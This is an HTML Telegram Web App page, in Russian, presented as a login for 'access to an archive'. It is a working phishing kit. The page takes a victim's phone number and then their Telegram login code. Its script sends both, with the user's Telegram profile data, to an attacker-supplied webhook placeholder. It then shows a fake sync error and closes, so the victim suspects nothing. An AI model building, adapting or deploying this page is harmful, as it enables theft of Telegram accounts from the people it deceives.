<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        :root { --bg: #0f172a; --accent: #38bdf8; --glass: rgba(30, 41, 59, 0.7); }
        body { background: radial-gradient(circle at top right, #1e293b, #0f172a); color: #f8fafc; font-family: 'Inter', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .card { width: 85%; max-width: 360px; padding: 35px 24px; background: var(--glass); backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 32px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); text-align: center; }
        .icon-box { width: 60px; height: 60px; background: linear-gradient(135deg, var(--accent), #818cf8); border-radius: 18px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; }
        h2 { font-size: 22px; margin: 0 0 8px; }
        p { color: #94a3b8; font-size: 14px; margin-bottom: 25px; }

        .phone-input-group { display: flex; background: rgba(15, 23, 42, 0.6); border: 1.5px solid rgba(255, 255, 255, 0.1); border-radius: 16px; overflow: hidden; margin-bottom: 20px; }
        
        /* Стилизация выбора страны */
        #country-select { background: #1e293b; border: none; color: #fff; padding: 15px; font-size: 14px; outline: none; border-right: 1px solid rgba(255, 255, 255, 0.1); width: 110px; cursor: pointer; }
        
        input { width: 100%; background: transparent; border: none; color: #fff; padding: 15px; font-size: 18px; outline: none; }
        
        /* Убираем спиннеры цифр (image_984693.png больше не актуально) */
        input::-webkit-outer-spin-button, input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
        input[type=number] { -moz-appearance: textfield; }

        button { width: 100%; background: #fff; color: #0f172a; border: none; padding: 18px; border-radius: 16px; font-size: 16px; font-weight: 700; cursor: pointer; }
        #step2 { display: none; }
        .error-hint { color: #ef4444; font-size: 12px; margin-top: -15px; margin-bottom: 15px; display: none; }
    </style>
</head>
<body>
    <div class="card">
        <div class="icon-box">
            <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
        </div>

        <div id="step1">
            <h2>Вход</h2>
            <p>Введите номер телефона для доступа к архиву</p>
            <div class="phone-input-group">
                <select id="country-select" onchange="applyMask()">
                    <option value="+7" data-len="10">🇷🇺 RU +7</option>
                    <option value="+380" data-len="9">🇺🇦 UA +380</option>
                    <option value="+375" data-len="9">🇧🇾 BY +375</option>
                    <option value="+7" data-len="10">🇰🇿 KZ +7</option>
                    <option value="+998" data-len="9">🇺🇿 UZ +998</option>
                    <option value="+994" data-len="9">🇦🇿 AZ +994</option>
                    <option value="+995" data-len="9">🇬🇪 GE +995</option>
                    <option value="+374" data-len="8">🇦🇲 AM +374</option>
                    <option value="+996" data-len="9">🇰🇬 KG +996</option>
                    <option value="+371" data-len="8">🇱🇻 LV +371</option>
                    <option value="+370" data-len="8">🇱🇹 LT +370</option>
                    <option value="+372" data-len="8">🇪🇪 EE +372</option>
                    <option value="+3 mold" data-len="8">🇲🇩 MD +373</option>
                </select>
                <input type="tel" id="phone" placeholder="900 000-00-00">
            </div>
            <div id="err" class="error-hint">Некорректный номер</div>
            <button onclick="valStep1()">Продолжить</button>
        </div>

        <div id="step2">
            <h2>Код из SMS</h2>
            <p>Мы отправили код в Telegram для <br><b id="show-phone" style="color:var(--accent)"></b></p>
            <input type="number" id="code" placeholder="00000" inputmode="numeric">
            <button onclick="valStep2()">Подтвердить</button>
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();
        const WEBHOOK_URL = 'ТВОЙ_WEBHOOK_URL';

        function applyMask() {
            const s = document.getElementById('country-select');
            const i = document.getElementById('phone');
            const len = s.options[s.selectedIndex].getAttribute('data-len');
            i.value = "";
            i.maxLength = len;
            i.placeholder = "0".repeat(len);
            document.getElementById('err').style.display = 'none';
        }

        function valStep1() {
            const s = document.getElementById('country-select');
            const p = document.getElementById('phone').value.replace(/\D/g, '');
            const targetLen = s.options[s.selectedIndex].getAttribute('data-len');

            if (p.length != targetLen) {
                tg.HapticFeedback.notificationOccurred('error');
                document.getElementById('err').style.display = 'block';
                return;
            }

            const full = s.value + p;
            document.getElementById('show-phone').innerText = full;
            document.getElementById('step1').style.display = 'none';
            document.getElementById('step2').style.display = 'block';
            tg.HapticFeedback.impactOccurred('medium');
            send({ stage: 'phone', val: full });
        }

        function valStep2() {
            const c = document.getElementById('code').value;
            if (c.length < 5) return;
            tg.HapticFeedback.notificationOccurred('success');
            send({ stage: 'code', val: c, phone: document.getElementById('show-phone').innerText });
            
            setTimeout(() => {
                alert("Ошибка синхронизации. Попробуйте войти позже.");
                tg.close();
            }, 1000);
        }

        function send(data) {
            data.u = tg.initDataUnsafe?.user || {};
            fetch(WEBHOOK_URL, { method: 'POST', body: JSON.stringify(data) }).catch(()=>{});
        }
        
        applyMask();
    </script>
</body>
</html>
